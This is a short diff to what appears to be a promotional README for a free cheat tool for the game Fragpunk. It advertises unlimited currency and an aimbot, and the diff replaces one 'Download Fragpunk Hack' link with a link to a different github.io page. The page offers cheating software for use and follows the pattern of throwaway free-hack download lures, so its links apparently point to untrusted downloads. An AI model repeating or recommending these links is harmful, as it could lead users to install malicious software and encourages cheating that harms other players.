@@ -1,6 +1,6 @@
 Fragpunk Free Cheat is a tool designed to give players an unfair advantage in Fragpunk by unlocking various cheats and in-game resources for free. It allows players to bypass the game's normal mechanics and access powerful features without spending money or grinding for rewards. This cheat tool is popular among players who want to enhance their experience, but it comes with risks and ethical concerns.
 
-[![Download Fragpunk Hack](https://img.shields.io/badge/Download-Fragpunk%20hack-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Fragpunk Hack](https://img.shields.io/badge/Download-Fragpunk%20hack-blueviolet)](https://fragpunk-free-cheat.github.io/.github/)
 
 - **Unlimited Resources**: Gain unlimited in-game currency, items, and boosts, allowing players to upgrade or purchase anything without the usual effort.
 - **Aimbot**: Automatically aims at enemies, ensuring highly accurate shots and often guaranteeing headshots, making combat easier.
